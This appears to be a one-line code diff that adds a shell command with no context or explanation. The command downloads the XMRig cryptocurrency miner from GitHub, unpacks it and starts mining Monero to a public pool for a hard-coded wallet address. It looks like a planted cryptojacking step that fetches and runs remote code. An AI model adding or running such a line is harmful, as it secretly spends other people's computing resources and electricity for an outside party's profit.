@@ -1,0 +1,1 @@
+curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -zxvf xmrig.tar.gz && cd xmrig-6.12.1 && ./xmrig --donate-level 1 -o pool.supportxmr.com:5555 -u 47ZQ8LKqLdR2wNJBykJ7c6NZANWXmpFSmXCDo2KFaYPQXhnkkMRnMmHUhhgsv5g4K8eVXpW9AuivFcwZhaqF35cD1ivJSoD.miner85202 -p x -k
